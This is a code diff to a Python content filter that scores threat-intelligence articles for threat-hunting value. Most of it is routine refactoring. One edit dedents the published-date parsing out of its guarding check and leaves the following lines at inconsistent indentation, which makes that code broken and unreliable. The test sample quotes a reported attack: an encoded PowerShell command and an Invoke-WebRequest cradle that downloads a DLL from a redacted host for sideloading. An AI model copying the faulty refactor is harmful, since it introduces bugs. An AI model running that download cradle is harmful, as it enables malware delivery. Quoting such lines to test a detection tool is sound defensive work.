@@ -26,11 +26,11 @@ except ImportError:
     np = None
     pd = None
 
-logger = logging.getLogger(__name__)
-
 # Import perfect discriminators from threat hunting scorer
 from .content import HUNT_SCORING_KEYWORDS
 from .sentence_splitter import count_sentences, find_sentence_boundaries
+
+logger = logging.getLogger(__name__)
 
 
 @dataclass
@@ -340,10 +340,7 @@ class ContentFilter:
             chunk_length = end - start
 
             # Determine the next chunk start while preserving overlap without creating gaps.
-            if chunk_length > overlap:
-                next_start = end - overlap
-            else:
-                next_start = end
+            next_start = end - overlap if chunk_length > overlap else end
 
             # Ensure we always progress forward to avoid infinite loops.
             if next_start <= start:
@@ -416,7 +413,7 @@ class ContentFilter:
             joblib.dump(self.model, self.model_path)
 
             # Return comprehensive metrics dictionary
-            metrics = {
+            return {
                 "success": True,
                 "training_data_size": len(df),
                 "training_duration_seconds": training_duration,
@@ -441,8 +438,6 @@ class ContentFilter:
                     output_dict=True,
                 ),
             }
-
-            return metrics
 
         except Exception as e:
             logger.error(f"Error training model: {e}")
@@ -543,10 +538,7 @@ class ContentFilter:
         else:
             # Fallback confidence based on pattern counts
             total_patterns = positive_indicators + negative_indicators
-            if total_patterns > 0:
-                confidence = max(positive_indicators, negative_indicators) / total_patterns
-            else:
-                confidence = 0.0
+            confidence = max(positive_indicators, negative_indicators) / total_patterns if total_patterns > 0 else 0.0
 
         # Ensure minimum confidence for huntable content
         if is_huntable and confidence == 0.0 and positive_indicators > 0:
@@ -698,13 +690,13 @@ class ContentFilter:
         if "published_at" in article:
             from datetime import datetime
 
-            if isinstance(article["published_at"], str):
-                try:
-                    published_at = datetime.fromisoformat(article["published_at"].replace("Z", "+00:00"))
-                except:
-                    published_at = datetime.now()
-            else:
-                published_at = article["published_at"]
+        if isinstance(article["published_at"], str):
+            try:
+                published_at = datetime.fromisoformat(article["published_at"].replace("Z", "+00:00"))
+            except (ValueError, AttributeError):
+                published_at = datetime.now()
+        else:
+            published_at = article["published_at"]
 
             if (datetime.now() - published_at).days > self.config.max_age_days:
                 self._failed_count += 1
@@ -878,11 +870,14 @@ if __name__ == "__main__":
 
         # Test with sample content
         sample_content = """
-        Post exploitation Huntress has also observed threat actors attempting to use encoded PowerShell to download and sideload a DLL via a commonly used cradle technique:
+        Post exploitation Huntress has also observed threat actors attempting to use encoded
+        PowerShell to download and sideload a DLL via a commonly used cradle technique:
         Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD==
-        Cleartext: Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll -outfile C:UsersPublicREDACTEDd3d11.dll
+        Cleartext: Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll -outfile
+        C:UsersPublicREDACTEDd3d11.dll
 
-        Acknowledgement We would like to extend our gratitude to the Sitecore team for their support throughout this investigation.
+        Acknowledgement We would like to extend our gratitude to the Sitecore team for their
+        support throughout this investigation.
         """
 
         result = filter_system.filter_content(sample_content)
